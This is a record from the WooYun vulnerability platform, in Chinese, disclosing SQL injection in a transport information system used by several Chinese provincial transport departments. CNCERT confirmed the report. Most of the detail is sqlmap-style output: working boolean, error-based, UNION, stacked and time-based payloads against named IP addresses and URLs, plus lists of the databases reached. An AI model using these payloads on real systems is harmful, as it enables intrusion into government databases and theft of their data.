{"id": 7684, "wybug_id": "wooyun-2013-036353", "wybug_title": "全国交通系统某信息管理系统SQL注入涉及全国各省交通厅", "wybug_corp": "cncert", "wybug_author": "霍大然", "wybug_date": "2013-10-23 10:45", "wybug_open_date": "2013-12-07 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-07：\t细节向公众公开  简要描述： 全国交通系统某信息管理系统SQL注入，涉及全国各省交通厅，给20吧，贴了好多图 详细说明：  1、陕西的：http://113.140.70.184:4016/forUI/default.aspx\n\n注入点：http://113.140.70.184:4016/forui/corpinfo/corpbaseinfo.aspx?CorpCode=1Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6' AND 2037=2037 AND 'FixY'='FixY    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6' AND 1147=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(108)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (1147=1147) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(114)+CHAR(119)+CHAR(98)+CHAR(58))) AND 'SXpO'='SXpO    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ID=bce95413-5238-4484-861a-f8a75e6221a6' WAITFOR DELAY '0:0:5'-----available databases [4]:[*] hs_sx_glj[*] master[*] model[*] msdb\n\n\n\n管理员密码的hash:\n\n2、北京http://210.75.218.36/forUI/default.aspx\n\n注入点：http://210.75.218.36/forUI/CorpInfo/CorpBaseInfo.aspx?CorpCode=63377640Place: GETParameter: CorpCode    Type: UNION query    Title: Generic UNION query (NULL) - 63 columns    Payload: CorpCode=63377640' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(114)+CHAR(115)+CHAR(109)+CHAR(58)+CHAR(99)+CHAR(68)+CHAR(109)+CHAR(102)+CHAR(101)+CHAR(81)+CHAR(109)+CHAR(79)+CHAR(67)+CHAR(65)+CHAR(58)+CHAR(114)+CHAR(117)+CHAR(109)+CHAR(58)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CorpCode=63377640'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CorpCode=63377640' WAITFOR DELAY '0:0:5'-----available databases [10]:[*] BJ_HONOR[*] BJ_HONOR0412[*] BJ_HONOR_NOW[*] master[*] model[*] msdb[*] Northwind[*] ot_hs_bj_now[*] pubs[*] tempdb3、西藏网站地址：http://219.151.34.147:801注入点：http://219.151.34.147:801/forUI/CorpInfo/CorpBaseInfo.aspx?CorpCode=20282728lace: GETParameter: CorpCode    Type: UNION query    Title: Generic UNION query (NULL) - 63 columns    Payload: CorpCode=20282728' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(100)+CHAR(108)+CHAR(97)+CHAR(58)+CHAR(83)+CHAR(85)+CHAR(66)+CHAR(109)+CHAR(102)+CHAR(121)+CHAR(65)+CHAR(108)+CHAR(67)+CHAR(75)+CHAR(58)+CHAR(112)+CHAR(101)+CHAR(116)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: CorpCode=20282728'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: CorpCode=20282728' WAITFOR DELAY '0:0:5'-----available databases [7]:[*] master[*] model[*] msdb[*] ot_hs_xz[*] ReportServer[*] ReportServerTempDB[*] tempdb   漏洞证明：  不一个一个找了，百度吧：\n\n   修复方案：  过滤   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-27 23:32 厂商回复： CNVD确认并复现多个实例，此前已经通报过该案例，已经向交通部中国交通信息中心通报，同时也抄报交通部公路科学研究院。rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-23 12:44 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  好几个月的翻出来了    \n     2013-11-27 09:08 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  @霍大然 有别人在又一次上报，然后发现已经有人报过了但是还是待审核，就会翻出来    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}